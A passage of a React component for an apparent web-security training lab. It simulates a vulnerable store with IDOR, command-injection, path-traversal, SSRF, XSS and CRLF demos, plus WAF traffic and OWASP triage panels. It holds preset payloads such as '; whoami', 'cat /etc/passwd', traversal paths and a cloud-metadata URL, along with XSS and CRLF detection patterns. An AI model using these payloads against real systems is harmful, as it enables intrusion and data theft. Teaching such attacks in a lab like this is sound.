                                <span className="text-2xl p-1.5 rounded-lg bg-slate-100">{item.product.icon}</span>
                                <div>
                                  <p className="text-xs font-bold text-slate-900">{item.product.name}</p>
                                  <p className="text-[10px] text-slate-500">Qty: {item.quantity}</p>
                                </div>
                              </div>
                              <span className="font-mono font-bold text-xs text-cyan-700">
                                ${(item.product.price * item.quantity).toFixed(2)}
                              </span>
                            </div>
                          ))}
                          <div className="pt-2 flex justify-between items-center text-xs">
                            <span className="font-bold text-slate-900">Subtotal:</span>
                            <span className="font-mono font-black text-sm text-cyan-700">${cartTotal.toFixed(2)}</span>
                          </div>
                        </div>

                        {/* IDOR Order Lookup */}
                        <div className="md:col-span-6 rounded-2xl border border-red-200 bg-red-50/70 p-5 space-y-3 shadow-sm">
                          <div className="flex items-center gap-2">
                            <span className="text-lg">🔓</span>
                            <div>
                              <h3 className="text-xs font-bold text-red-900 uppercase tracking-wider">
                                Track Order by ID (IDOR Vulnerability)
                              </h3>
                              <p className="text-[10px] text-slate-600">
                                Change Order ID to view other users' confidential receipts.
                              </p>
                            </div>
                          </div>

                          <div className="flex gap-2">
                            <Input
                              value={orderLookupId}
                              onChange={(e) => setOrderLookupId(e.target.value)}
                              placeholder="Order ID"
                              className="h-9 font-mono text-xs bg-white border-slate-300 text-slate-900"
                            />
                            <Button
                              size="sm"
                              onClick={() => handleOrderLookup(orderLookupId)}
                              className="h-9 px-4 text-xs font-bold bg-red-600 text-white hover:bg-red-700 shadow-sm"
                            >
                              Fetch Order
                            </Button>
                          </div>

                          <div className="flex flex-wrap gap-1.5">
                            {["1001 (My Order)", "1002 (CFO VIP)", "1003 (Director)", "1004 (DBA)"].map((opt) => {
                              const idOnly = opt.split(" ")[0];
                              return (
                                <button
                                  key={opt}
                                  type="button"
                                  onClick={() => {
                                    setOrderLookupId(idOnly);
                                    handleOrderLookup(idOnly);
                                  }}
                                  className="rounded border border-red-300 bg-white px-2 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100 shadow-sm"
                                >
                                  ID: {opt}
                                </button>
                              );
                            })}
                          </div>

                          {/* Looked Up Order Result */}
                          {lookedUpOrder && (
                            <div
                              className={cn(
                                "rounded-xl border p-3 text-xs space-y-1.5 font-mono shadow-sm",
                                lookedUpOrder.isConfidential
                                  ? "border-red-300 bg-white text-red-950"
                                  : "border-slate-200 bg-white text-slate-800"
                              )}
                            >
                              <div className="flex justify-between items-center border-b border-slate-200 pb-1">
                                <span className="font-bold">INVOICE #{lookedUpOrder.id}</span>
                                <span className="rounded bg-emerald-100 text-emerald-800 border border-emerald-200 px-1.5 py-0.2 text-[9px] font-bold">
                                  {lookedUpOrder.status}
                                </span>
                              </div>
                              <p><span className="text-slate-500 font-medium">Customer:</span> {lookedUpOrder.customerName}</p>
                              <p><span className="text-slate-500 font-medium">Email:</span> {lookedUpOrder.email}</p>
                              <p><span className="text-slate-500 font-medium">Card on File:</span> ****-****-****-{lookedUpOrder.cardLast4}</p>
                              <p className="font-bold text-cyan-800"><span className="text-slate-500 font-medium">Total:</span> ${lookedUpOrder.total.toFixed(2)}</p>
                              {lookedUpOrder.isConfidential && (
                                <p className="text-[9px] font-bold text-red-700 bg-red-100 p-1.5 rounded border border-red-200">
                                  ⚠️ IDOR EXPLOITED: Accessed unauthorized executive billing records!
                                </p>
                              )}
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 6: USER DASHBOARD
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "dashboard" && currentUser && (
                    <div className="space-y-6">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <span className="text-4xl p-2.5 rounded-2xl bg-cyan-100 border border-cyan-200">
                            {currentUser.avatar}
                          </span>
                          <div>
                            <h2 className="text-lg font-bold text-slate-900">{currentUser.name}</h2>
                            <p className="text-xs text-slate-500 font-medium">
                              {currentUser.role} · {currentUser.department}
                            </p>
                          </div>
                        </div>

                        {currentUser.role.includes("Admin") && (
                          <Button
                            size="sm"
                            onClick={() => navigateTo("admin")}
                            className="h-8 text-xs font-bold rounded-xl bg-amber-600 text-white hover:bg-amber-700 shadow-sm"
                          >
                            <Unlock className="size-3.5 mr-1" /> Open Admin Vault
                          </Button>
                        )}
                      </div>

                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                        {[
                          { label: "Assigned Tokens", value: "3 FIDO2 Keys", icon: <Key className="size-4 text-cyan-600" /> },
                          { label: "Security Posture", value: "99 / 100", icon: <ShieldCheck className="size-4 text-emerald-600" /> },
                          { label: "API Requests", value: "18,492 reqs", icon: <TrendingUp className="size-4 text-indigo-600" /> },
                          { label: "Attack Intercepts", value: "349 blocked", icon: <Shield className="size-4 text-amber-600" /> },
                        ].map((s, idx) => (
                          <div key={idx} className="rounded-2xl border border-slate-200 bg-white p-3.5 space-y-1 shadow-sm">
                            <div className="flex items-center justify-between">
                              <span className="text-[10px] text-slate-500 font-semibold">{s.label}</span>
                              {s.icon}
                            </div>
                            <p className="font-mono font-bold text-base text-slate-900">{s.value}</p>
                          </div>
                        ))}
                      </div>

                      <div className="rounded-2xl border border-slate-200 bg-white p-5 space-y-3 shadow-sm">
                        <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                          Active API Keys & Environment Tokens
                        </h3>
                        <div className="rounded-xl bg-slate-50 border border-slate-200 p-3 font-mono text-xs flex justify-between items-center">
                          <div>
                            <p className="text-[10px] text-slate-500">Assigned Master Token:</p>
                            <p className="text-cyan-800 font-bold">{currentUser.apiKeys}</p>
                          </div>
                          <Button
                            size="sm"
                            variant="ghost"
                            onClick={() => toast.success("Token copied")}
                            className="h-7 text-xs text-slate-600 hover:text-slate-900"
                          >
                            <Copy className="size-3" />
                          </Button>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 7: SYSTEM DIAGNOSTICS (CMDI / LFI / SSRF)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "diagnostics" && (
                    <div className="space-y-6">
                      <div>
                        <h2 className="text-lg font-bold text-slate-900 flex items-center gap-2">
                          <Wrench className="size-5 text-emerald-600" /> System Diagnostics Console (RCE / LFI / SSRF)
                        </h2>
                        <p className="text-xs text-slate-500 mt-0.5">
                          Internal developer utilities used to diagnose network connectivity, file storage, and webhook
                          integrations.
                        </p>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        {/* 1. Network Ping Tool (CMDi) */}
                        <div className="rounded-2xl border border-slate-200 bg-white p-4 flex flex-col justify-between space-y-3 shadow-sm">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <Terminal className="size-4 text-emerald-600" />
                              <h3 className="text-xs font-bold text-slate-900 uppercase">1. Ping Tool (CMDi)</h3>
                            </div>
                            <Input
                              value={pingHost}
                              onChange={(e) => setPingHost(e.target.value)}
                              className="h-8 font-mono text-xs bg-slate-50 border-slate-300 text-slate-900"
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {["8.8.8.8; whoami", "127.0.0.1 && cat /etc/passwd"].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handlePingExecute(p)}
                                  className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100"
                                >
                                  {p}
                                </button>
                              ))}
                            </div>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => handlePingExecute(pingHost)}
                            className="w-full h-8 text-xs font-bold bg-emerald-600 text-white hover:bg-emerald-700 shadow-sm"
                          >
                            Execute Ping
                          </Button>
                        </div>

                        {/* 2. File Downloader (Path Traversal) */}
                        <div className="rounded-2xl border border-slate-200 bg-white p-4 flex flex-col justify-between space-y-3 shadow-sm">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <FileCode className="size-4 text-cyan-600" />
                              <h3 className="text-xs font-bold text-slate-900 uppercase">2. Report Viewer (LFI)</h3>
                            </div>
                            <Input
                              value={traversalPath}
                              onChange={(e) => setTraversalPath(e.target.value)}
                              className="h-8 font-mono text-xs bg-slate-50 border-slate-300 text-slate-900"
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {["../../../../etc/passwd", "..\\..\\windows\\win.ini"].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handleTraversalExecute(p)}
                                  className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100"
                                >
                                  {p}
                                </button>
                              ))}
                            </div>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => handleTraversalExecute(traversalPath)}
                            className="w-full h-8 text-xs font-bold bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm"
                          >
                            Fetch Report File
                          </Button>
                        </div>

                        {/* 3. Webhook Tester (SSRF) */}
                        <div className="rounded-2xl border border-slate-200 bg-white p-4 flex flex-col justify-between space-y-3 shadow-sm">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <Globe2 className="size-4 text-indigo-600" />
                              <h3 className="text-xs font-bold text-slate-900 uppercase">3. Webhook (SSRF)</h3>
                            </div>
                            <Input
                              value={webhookUrl}
                              onChange={(e) => setWebhookUrl(e.target.value)}
                              className="h-8 font-mono text-xs bg-slate-50 border-slate-300 text-slate-900"
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin"].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handleWebhookExecute(p)}
                                  className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100"
                                >
                                  {p.slice(0, 20)}...
                                </button>
                              ))}
                            </div>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => handleWebhookExecute(webhookUrl)}
                            className="w-full h-8 text-xs font-bold bg-indigo-600 text-white hover:bg-indigo-700 shadow-sm"
                          >
                            Verify Webhook
                          </Button>
                        </div>
                      </div>

                      {/* Server Output Console */}
                      {(pingOutput || traversalOutput || webhookOutput) && (
                        <div className="rounded-2xl border border-slate-200 bg-white p-4 font-mono text-xs space-y-2 text-slate-900 shadow-sm">
                          <div className="flex justify-between items-center border-b border-slate-200 pb-1.5">
                            <span className="text-cyan-700 font-bold flex items-center gap-1.5">
                              <Terminal className="size-3.5" /> Backend Server Output
                            </span>
                            <button
                              type="button"
                              onClick={() => {
                                setPingOutput(null);
                                setTraversalOutput(null);
                                setWebhookOutput(null);
                              }}
                              className="text-slate-400 hover:text-slate-900 text-[10px]"
                            >
                              Clear
                            </button>
                          </div>
                          {pingOutput && <pre className="text-emerald-700 whitespace-pre-wrap font-semibold">{pingOutput}</pre>}
                          {traversalOutput && <pre className="text-cyan-800 whitespace-pre-wrap font-semibold">{traversalOutput}</pre>}
                          {webhookOutput && <pre className="text-amber-800 whitespace-pre-wrap font-semibold">{webhookOutput}</pre>}
                        </div>
                      )}
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 8: ADMIN CONSOLE & SECRETS VAULT
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "admin" && (
                    <div className="space-y-6">
                      <div className="rounded-2xl border border-amber-300 bg-amber-50 p-5 shadow-sm">
                        <div className="flex items-center gap-3">
                          <span className="text-3xl">👑</span>
                          <div>
                            <h2 className="text-base font-extrabold text-amber-900">
                              Executive Admin Vault & User Directory
                            </h2>
                            <p className="text-xs text-amber-800">
                              Confidential database user credentials and master encryption keys.
                            </p>
                          </div>
                        </div>
                      </div>

                      <div className="rounded-2xl border border-slate-200 bg-white p-5 space-y-3 shadow-sm">
                        <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                          Internal User Database (Password Hashes & Tokens)
                        </h3>
                        <div className="overflow-x-auto">
                          <table className="w-full text-left text-xs">
                            <thead>
                              <tr className="border-b border-slate-200 text-slate-500 text-[10px] uppercase font-bold">
                                <th className="py-2">User</th>
                                <th className="py-2">Email</th>
                                <th className="py-2">Role</th>
                                <th className="py-2">API Secret</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-slate-100 font-mono text-[11px]">
                              {FAKE_USERS.map((u, i) => (
                                <tr key={i} className="hover:bg-slate-50">
                                  <td className="py-2 font-bold text-slate-900">
                                    {u.avatar} {u.username}
                                  </td>
                                  <td className="py-2 text-slate-500">{u.email}</td>
                                  <td className="py-2 text-cyan-800 font-semibold">{u.role}</td>
                                  <td className="py-2 text-amber-800 font-semibold">{u.apiKeys}</td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 9: SUPPORT DESK (STORED XSS / CRLF)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "contact" && (
                    <div className="max-w-xl mx-auto space-y-6 py-2">
                      <div className="text-center space-y-1">
                        <h2 className="text-lg font-bold text-slate-900">Submit Support Ticket</h2>
                        <p className="text-xs text-slate-500">Contact our 24/7 Security Operations Center</p>
                      </div>

                      <form
                        onSubmit={(e) => {
                          e.preventDefault();
                          const isXss = /<script|onerror|onload|<img/i.test(contactName + contactMessage);
                          const isCrlf = /%0a|%0d|bcc:|subject:/i.test(contactEmail);
                          executeRequest(
                            `name=${encodeURIComponent(contactName)}&email=${encodeURIComponent(
                              contactEmail
                            )}&subject=${encodeURIComponent(contactSubject)}&message=${encodeURIComponent(
                              contactMessage
                            )}`,
                            "message",
                            "POST",
                            "/api/support/tickets",
                            isXss ? "stored-xss" : isCrlf ? "email-injection" : undefined
                          );
                        }}
                        className="rounded-2xl border border-slate-200 bg-white p-5 space-y-3.5 shadow-sm"
                      >
                        <div className="grid grid-cols-2 gap-3">
                          <div>
                            <label className="block text-[11px] font-bold text-slate-700 mb-1">Your Name</label>
                            <Input
                              value={contactName}
                              onChange={(e) => setContactName(e.target.value)}
                              className="h-9 text-xs font-mono bg-slate-50 border-slate-300 text-slate-900"
                            />
                          </div>
                          <div>
                            <label className="block text-[11px] font-bold text-slate-700 mb-1">
                              Email (CRLF Injection Vector)
                            </label>
                            <Input
                              value={contactEmail}
                              onChange={(e) => setContactEmail(e.target.value)}
                              className="h-9 text-xs font-mono bg-slate-50 border-slate-300 text-slate-900"
                            />
                          </div>
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-slate-700 mb-1">Subject</label>
                          <Input
                            value={contactSubject}
                            onChange={(e) => setContactSubject(e.target.value)}
                            className="h-9 text-xs bg-slate-50 border-slate-300 text-slate-900"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-slate-700 mb-1">
                            Message (Stored XSS Vector)
                          </label>
                          <Textarea
                            value={contactMessage}
                            onChange={(e) => setContactMessage(e.target.value)}
                            className="min-h-24 text-xs font-mono bg-slate-50 border-slate-300 text-slate-900 resize-none"
                          />
                        </div>

                        <Button type="submit" className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm">
                          Submit Ticket →
                        </Button>
                      </form>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 10: KNOWLEDGE BASE & DOCS
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "docs" && (
                    <div className="space-y-6">
                      <div className="text-center space-y-1.5 max-w-md mx-auto">
                        <h2 className="text-lg font-bold text-slate-900">Knowledge Base & Security Docs</h2>
                        <p className="text-xs text-slate-500">Search technical integration guides</p>
                      </div>

                      <div className="space-y-3">
                        {DOC_ARTICLES.map((doc) => (
                          <div key={doc.id} className="rounded-2xl border border-slate-200 bg-white p-4 space-y-1 shadow-sm">
                            <div className="flex justify-between items-center">
                              <h3 className="text-xs font-bold text-cyan-800">{doc.title}</h3>
                              <span className="rounded bg-slate-100 px-2 py-0.5 text-[9px] font-semibold text-slate-600">
                                {doc.category}
                              </span>
                            </div>
                            <p className="text-xs text-slate-600">{doc.snippet}</p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
            </>
            )}

            {/* In-Browser Footer */}
            <div className="border-t border-slate-200 bg-slate-100/90 px-5 py-2.5 flex items-center justify-between text-[10px] text-slate-500">
              <span>© 2026 Apex CyberStore Systems · Protected by WebGuard AI WAF</span>
              <span className="flex items-center gap-1 font-mono">
                Reverse Proxy Target:{" "}
                <span className="text-cyan-700 font-bold">
                  {labMode === "live-target" ? targetUrlInput || "http://localhost:8080" : "http://127.0.0.1:8080"}
                </span>
              </span>
            </div>
          </div>
        </div>

        {/* ═══════════════════════════════════════════════════════════════════
            RIGHT: Live Traffic, Raw Terminal & Threat Analysis Panel
        ════════════════════════════════════════════════════════════════════ */}
        <div className="xl:col-span-5 flex flex-col gap-3">
          {/* Tab Selector */}
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-1.5">
              {[
                { id: "visual" as const, label: "Live Traffic", icon: <Globe2 className="size-3.5" /> },
                { id: "http" as const, label: "HTTP Terminal", icon: <Terminal className="size-3.5" /> },
                { id: "analysis" as const, label: "OWASP Triage", icon: <Bug className="size-3.5" /> },
              ].map((t) => (
                <button
                  key={t.id}
                  type="button"
                  onClick={() => setResponseTab(t.id)}
                  className={cn(
                    "flex items-center gap-1.5 rounded-xl border px-3 py-1.5 text-xs font-bold transition-all shadow-sm",
                    responseTab === t.id
                      ? "border-cyan-600 bg-cyan-600 text-white"
                      : "border-slate-200 bg-white text-slate-600 hover:text-slate-900 hover:bg-slate-50"
                  )}
                >
                  {t.icon} {t.label}
                </button>
              ))}
            </div>

            <Button
              variant="ghost"
              size="sm"
              className="h-7 text-[10px] text-slate-500 hover:text-slate-900"
              onClick={() => {
                setLogs([]);
                setLastResult(null);
                setActiveExploitDisplay(null);
              }}
            >
              <RefreshCw className="size-3 mr-1" /> Clear Stream
            </Button>
          </div>

          {/* Tab 1: Live Traffic Log */}
          {responseTab === "visual" && (
            <div className="flex min-h-[500px] max-h-[680px] flex-col overflow-hidden p-0 rounded-2xl border border-slate-200 bg-white text-slate-900 shadow-sm">
              <div className="flex items-center justify-between border-b border-slate-200 bg-slate-50 px-4 py-2.5">
                <span className="text-xs font-bold text-slate-900 flex items-center gap-1.5">
                  <Globe2 className="size-4 text-cyan-600" /> Intercepted HTTP Exchanges ({logs.length / 2})
                </span>
                <span className="text-[10px] text-slate-500 font-mono">Edge Pipeline</span>
              </div>

              <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
                {logs.length === 0 ? (
                  <div className="flex flex-col items-center justify-center py-28 text-center gap-2">
                    <Globe2 className="size-10 text-slate-300" />
                    <p className="text-xs font-semibold text-slate-700">Waiting for website traffic...</p>
                    <p className="text-[10px] text-slate-500 max-w-xs">
                      Interact with the store on the left (search, review, ping, IDOR order lookup) to see real-time
                      packet inspection.
                    </p>
                  </div>
                ) : (
                  logs.map((log) => (
                    <div
                      key={log.id}
                      className={cn(
                        "rounded-xl border p-3 text-xs space-y-2 transition-all shadow-sm",
                        log.type === "request"
                          ? "border-cyan-200 bg-cyan-50/50"
                          : log.type === "waf"
                          ? "border-emerald-200 bg-emerald-50/70"
                          : "border-red-200 bg-red-50/50"
                      )}
                    >
                      <div className="flex items-center gap-2">
                        <span
                          className={cn(
                            "rounded px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wider text-white",
                            log.type === "request"
                              ? "bg-cyan-600"
                              : log.type === "waf"
                              ? "bg-emerald-600"
                              : "bg-red-600"
                          )}
                        >
                          {log.type === "request" ? "→ INGRESS" : log.type === "waf" ? "🛡️ WAF 403" : "← EGRESS"}
                        </span>
                        {log.method && (
                          <span className="font-mono text-[10px] font-bold text-slate-900">{log.method}</span>
                        )}
                        {log.path && <span className="font-mono text-[10px] text-slate-600 truncate">{log.path}</span>}
                        {log.threatScore !== undefined && (
                          <span
                            className={cn(
                              "ml-auto font-mono text-[9px] font-bold px-1.5 py-0.5 rounded border",
                              log.threatScore > 70
                                ? "bg-red-50 text-red-700 border-red-200"
                                : log.threatScore > 30
                                ? "bg-amber-50 text-amber-700 border-amber-200"
                                : "bg-emerald-50 text-emerald-700 border-emerald-200"
                            )}
                          >
                            Score: {log.threatScore}/100
                          </span>
                        )}
                      </div>

                      {log.body && (
                        <pre className="max-h-20 overflow-x-auto rounded bg-slate-100 p-2 font-mono text-[10px] text-slate-800 whitespace-pre-wrap border border-slate-200 font-medium">
                          {log.body}
                        </pre>
                      )}

                      {log.vulnId && VULN_DEFS[log.vulnId] && (
                        <div className="flex items-center justify-between border-t border-slate-200 pt-1.5 text-[10px]">
                          <span className="text-slate-600 font-semibold">
                            CWE: {VULN_DEFS[log.vulnId].cwe} · {VULN_DEFS[log.vulnId].label}
                          </span>
                          <span
                            className={cn(
                              "rounded-full px-2 py-0.2 text-[8px] font-bold",
                              SEVERITY_META[VULN_DEFS[log.vulnId].severity].badge
                            )}
                          >
                            {SEVERITY_META[VULN_DEFS[log.vulnId].severity].label}
                          </span>
                        </div>
                      )}
                    </div>
                  ))
                )}
                <div ref={logsEndRef} />
              </div>
            </div>
          )}

          {/* Tab 2: Raw HTTP Terminal Stream */}
          {responseTab === "http" && (
            <div className="flex min-h-[500px] max-h-[680px] flex-col overflow-hidden p-0 rounded-2xl border border-slate-200 bg-white text-slate-900 shadow-sm">
              <div className="flex items-center justify-between border-b border-slate-200 bg-slate-50 px-4 py-2.5">
                <span className="text-xs font-mono font-bold text-cyan-700 flex items-center gap-1.5">
                  <Terminal className="size-3.5" /> Socket Stream Inspector
                </span>
                <span className="text-[10px] text-slate-500 font-mono">HTTP/1.1 Edge</span>
              </div>

              <div className="flex-1 overflow-y-auto p-4 font-mono text-[11px] leading-relaxed text-slate-800 space-y-4">
                {logs.length === 0 ? (
                  <span className="text-slate-400"># No packets logged yet.</span>
                ) : (
                  logs.map((log) => (
                    <div key={log.id} className="border-b border-slate-100 pb-3">
                      <p className="text-[9px] text-slate-400 mb-1 font-semibold">
                        ─── {new Date(log.ts).toLocaleTimeString()} ───
                      </p>
                      {log.type === "request" && (
                        <>
                          <p className="text-cyan-700 font-bold">
                            → {log.method} {log.path} HTTP/1.1
                          </p>
                          <p className="text-slate-500">Host: apex-cyberstore.io</p>
                          <p className="text-slate-500">User-Agent: Mozilla/5.0 (Windows NT 10.0)</p>
                          {log.body && <p className="text-emerald-700 mt-1 font-semibold bg-slate-50 p-1.5 rounded border border-slate-200">{log.body}</p>}
                        </>
                      )}
                      {log.type === "waf" && (
                        <>
                          <p className="text-emerald-700 font-bold">← HTTP/1.1 403 Forbidden (WAF Intercept)</p>
                          <p className="text-slate-500">X-WebGuard-Rule: {log.vulnId?.toUpperCase()}</p>
                          <p className="text-slate-500">X-WebGuard-Action: BLOCKED_AT_EDGE</p>
                          <p className="text-emerald-800 mt-1 bg-emerald-50 p-1.5 rounded border border-emerald-200 font-medium">{log.body?.slice(0, 160)}...</p>
                        </>
                      )}
                      {log.type === "response" && (
                        <>
                          <p className="text-red-700 font-bold">← HTTP/1.1 {log.status} OK (Backend Response)</p>
                          <p className="text-slate-500">Server: Uvicorn/FastAPI (Port 8080)</p>
                          <p className="text-slate-500">Content-Type: application/json</p>
                          <p className="text-red-800 mt-1 bg-red-50 p-1.5 rounded border border-red-200 font-medium">{log.body?.slice(0, 160)}...</p>
                        </>
                      )}
                    </div>
                  ))
                )}
              </div>
            </div>
          )}

          {/* Tab 3: OWASP Attack Triage */}
          {responseTab === "analysis" && (
            <div className="flex min-h-[500px] max-h-[680px] flex-col overflow-hidden p-4 rounded-2xl border border-slate-200 bg-white text-slate-900 shadow-sm space-y-4">
              <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500 flex items-center gap-1.5">
                <Bug className="size-4 text-red-600" /> OWASP Threat Classification & Virtual Patch
              </h3>

              {!lastResult || !lastResult.vulnId ? (
                <div className="flex flex-col items-center justify-center py-28 text-center gap-2">
                  <Bug className="size-10 text-slate-300" />
                  <p className="text-xs text-slate-600 font-medium">No recent exploit analyzed.</p>
                  <p className="text-[10px] text-slate-400">
                    Trigger an attack (SQLi, XSS, CMDi) from the store to inspect the vulnerability defense breakdown.
                  </p>
                </div>
              ) : (
                <div className="space-y-4 overflow-y-auto pr-1">
                  <div
                    className={cn(
                      "rounded-2xl border-2 p-4 flex items-center gap-3 shadow-sm",
                      lastResult.blocked
                        ? "border-emerald-300 bg-emerald-50 text-emerald-950"
                        : "border-red-300 bg-red-50 text-red-950"
                    )}
                  >
                    {lastResult.blocked ? (
                      <ShieldCheck className="size-8 text-emerald-600" />
                    ) : (
                      <ShieldAlert className="size-8 text-red-600" />
                    )}
                    <div>
                      <h4
                        className={cn(
                          "text-sm font-extrabold",
                          lastResult.blocked ? "text-emerald-900" : "text-red-900"
                        )}
                      >
                        {lastResult.blocked ? "🛡️ Attack Dropped by WebGuard Edge (403 Forbidden)" : "⚠️ Vulnerability Exploited!"}
                      </h4>
                      <p className="text-xs text-slate-600">
                        {VULN_DEFS[lastResult.vulnId]?.label || "Custom Attack"}
                      </p>
                    </div>
                  </div>

                  {VULN_DEFS[lastResult.vulnId] && (
                    <div className="rounded-2xl border border-slate-200 bg-slate-50 p-4 space-y-2.5 text-xs shadow-sm">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-slate-900">{VULN_DEFS[lastResult.vulnId].label}</span>
                        <span
                          className={cn(
                            "rounded-full px-2 py-0.5 text-[9px] font-bold",
                            SEVERITY_META[VULN_DEFS[lastResult.vulnId].severity].badge
                          )}
                        >
                          {SEVERITY_META[VULN_DEFS[lastResult.vulnId].severity].label}
                        </span>
                      </div>
                      <p className="text-slate-600 text-[11px] leading-relaxed">
                        {VULN_DEFS[lastResult.vulnId].description}
                      </p>
                      <div className="flex gap-4 text-[10px] text-slate-500 font-semibold">
                        <span>CWE: {VULN_DEFS[lastResult.vulnId].cwe}</span>
                        <span>OWASP: {VULN_DEFS[lastResult.vulnId].owasp}</span>
                      </div>

                      <div className="rounded-xl border border-emerald-300 bg-emerald-50 p-3 space-y-1">
                        <p className="text-[10px] font-bold text-emerald-800 uppercase tracking-wider">
                          🛡️ WebGuard Virtual Patch Policy:
                        </p>
                        <p className="text-[11px] text-emerald-900 font-mono font-semibold">
                          {VULN_DEFS[lastResult.vulnId].wafPatch}
                        </p>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
